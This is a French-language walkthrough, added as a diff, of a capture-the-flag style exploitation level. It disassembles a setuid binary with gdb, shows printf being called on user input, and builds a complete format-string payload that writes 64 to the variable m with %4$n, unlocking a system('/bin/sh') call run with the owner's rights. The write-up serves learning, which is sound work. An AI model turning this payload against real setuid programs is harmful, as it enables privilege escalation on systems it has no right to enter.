@@ -1,0 +1,99 @@
+Nous avons comme d'habitude, un fichier binaire, qui a pour proprietaire level4,
+et qui a le marqueur setuid actif (s) qui signifie qu'il s'executera selon les droits du proprietaire.
+Avec gdb, on voit que le main apppelle simplement une fonction v.
+Et dans cette fonction v, on voit plusieurs choses.
+Tout d'abord, il y a un appelle systeme à /bin/sh qui est fait :
+
+(gdb) disas v
+       | ...
+       │0x804850c <v+104>       movl   $0x804860d,(%esp)                                                   │
+       │0x8048513 <v+111>       call   0x80483c0 <system@plt> 
+       | ...
+(gdb) x/s 0x804860d
+    0x804860d:       "/bin/sh"
+
+Mais également que pour arriver a cet appel system, il faut remplir une condition : qu'une certaine variable m, 
+dont on a l'addresse, soit égale à 64.
+
+(gdb) disas v
+   | ...
+   │0x80484da <v+54>        mov    0x804988c,%eax                                                      │
+   │0x80484df <v+59>        cmp    $0x40,%eax                                                          │
+   │0x80484e2 <v+62>        jne    0x8048518 <v+116>
+   | ...
+(gdb) x/s 0x804988c
+    0x804988c <m>:   ""
+
+Ce que l'on souhaite donc, c'est écrire l'int 64 dans la variable m, situé à l'addresse 0x804988c.
+Or printf pourrait nous aider à parvenir à cela, car il existe un specific modifier de printf (%n), qui ne print pas sur stdout, mais plutot ecrit à l'emplacement donné le nombre de caractere precedent ce %n:
+exemple: 
+int main()
+{
+  int e;
+  printf("Compte les lettres jusque là. %nMais plus là. ", &e);
+  printf("\nResultat: %d", e); // e = 29.
+ 
+  return 0;
+}
+
+Puisqu'on a l'addresse de la variable m, on pourrait imaginer utiliser la fonction printf comme ceci.
+printf("*METTRE 64 LETTRE ICI*%n ", 0x804988c);
+Mais ce n'est pas si facile puisqu'evidemment mon addresse sera lu comme une string et non comme une addresse.
+
+Mais, on peut voir également que contrairement au level précédent, un printf est utilisé, mais sans argument de type string envoyé au préalable,
+c'est à dire sans parsage de vérification. La variable que l'on donne en argument, est donné directement à lire par printf.
+
+En d'autre termes, il y a bien une faille ici. Si l'on donne comme argument au programme une chaine de caractere que printf derait parser, le programme plantera.
+En effet, dans l'emploi de printf("%d", 11), printf va chercher l'int correspondant dans ses arguments.
+Mais s'il ne trouve aucun argument, il va remonter directement dans la mémoire pour trouver quelque chose à imprimer.
+
+$ echo "%d" | ./level3
+    512
+
+Or 512 correspond bien au premier integer que l'on trouve dans le programme en le remontant.
+(gdb) disas v
+    | ...
+    | 0x080484a4 <+0>:	push   %ebp
+    | 0x080484a5 <+1>:	mov    %esp,%ebp
+    | 0x080484a7 <+3>:	sub    $0x218,%esp
+    | 0x080484ad <+9>:	mov    0x8049860,%eax
+    | 0x080484b2 <+14>:	mov    %eax,0x8(%esp)
+    | 0x080484b6 <+18>:	movl   $0x200,0x4(%esp)  <== 0x200 = 512 en hexa
+    | 0x080484be <+26>:	lea    -0x208(%ebp),%eax
+    | 0x080484c4 <+32>:	mov    %eax,(%esp)
+    | 0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
+    | 0x080484cc <+40>:	lea    -0x208(%ebp),%eax
+    | 0x080484d2 <+46>:	mov    %eax,(%esp)
+    | 0x080484d5 <+49>:	call   0x8048390 <printf@plt>
+    | ...
+
+En toute logique, si on met
+$ echo "%n" | ./level3
+cela reviendrait à écrire
+printf(%n)
+et donc l'écriture du nombre d'octet precedent le %n se fera dans la premiere addresse trouvé en remontant la stack.
+Il faut donc parvenir à remonter jusqu'à la bonne addresse, celle de notre variable m.
+Or graçe au gets, on sait que l'on peut écrire nous même dans un buffer, qq part sur la stack. On peut donc directement écrire notre addresse qq part dans la stack via ce buffer.
+On va chercher l'emplacement de ce buffer:
+$ python -c 'print "AAAA" + " %x " + " %x " + " %x " + " %x " + " %x " + " %x "' > /tmp/whereIsMyBuff
+$ cat /tmp/whereIsMyBuff | ./level3
+    AAAA 200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520
+                                    ^^^^^  
+On voit que nos "AAAA" on été écrit 4 addresse plus loin.
+
+Si on écrit notre l'addresse de m à la place de nos A, on aura donc l'emplacement de l'addresse m à cet endroit.
+Il suffit donc d'écrire 64 octet avant et de dire de l'ecrire dans 4 addresse.
+printf a une syntaxe pour dire d'ecrire directement à n argument plus loin:
+
+exemple :
+$(python -c 'print "%x " + "%x " + "%x"') | ./level3
+    200 b7fd1ac0 b7ff37d0
+$(python -c 'print "%3$x"') | ./level3
+    b7ff37d0
+
+on écrit donc notre addresse : 0x804988c => "\x08\x04\x98\x8c"[::-1]
+elle fait deja 4 octets, on en ajoute 60: 60 * "A"
+et on doit ecrire le nombre d'octet à la 4e addresse : "%4$n"
+
+$ python -c 'print "\x08\x04\x98\x8c"[::-1] + 60 * "A" + "%4$n"' > /tmp/exploit3
+$ cat /tmp/exploit3 - | ./level3
